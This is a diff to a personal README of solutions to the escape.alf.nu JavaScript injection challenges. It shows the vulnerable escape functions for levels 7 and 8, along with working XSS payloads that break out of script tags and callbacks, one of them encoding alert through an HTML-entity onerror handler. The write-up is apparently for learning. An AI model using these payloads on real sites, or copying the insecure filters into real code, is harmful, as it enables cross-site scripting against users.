@@ -3,6 +3,8 @@ JavaScript Injection Challenges Solutions
 
 Just a repository to keep my solutions to http://escape.alf.nu so that I can remember them over time...
 
+Useful tools: https://mothereff.in/html-entities
+
 
 LEVEL 0
 -------
@@ -118,3 +120,33 @@ LEVEL 6
 INPUT:
 
     Comment#--><script>alert(1)</script>
+
+
+LEVEL 7
+-------
+
+    function escape(s) {
+        // Pass inn "callback#userdata"
+        var thing = s.split(/#/); 
+
+        if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+        var obj = {'userdata': thing[1] };
+        var json = JSON.stringify(obj).replace(/</g, '\\u003c');
+        return "<script>" + thing[0] + "(" + json +")</script>";
+    }
+
+    '#';alert(1)//
+    
+
+LEVEL 8
+-------
+
+    function escape(s) {
+        return '<script>console.log("' + s.toUpperCase() + '")</script>';
+    }
+    
+    ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;//
+    ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)//
+    ")</script><img src onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)
+                                                 LINE BREAK HERE ☝
+
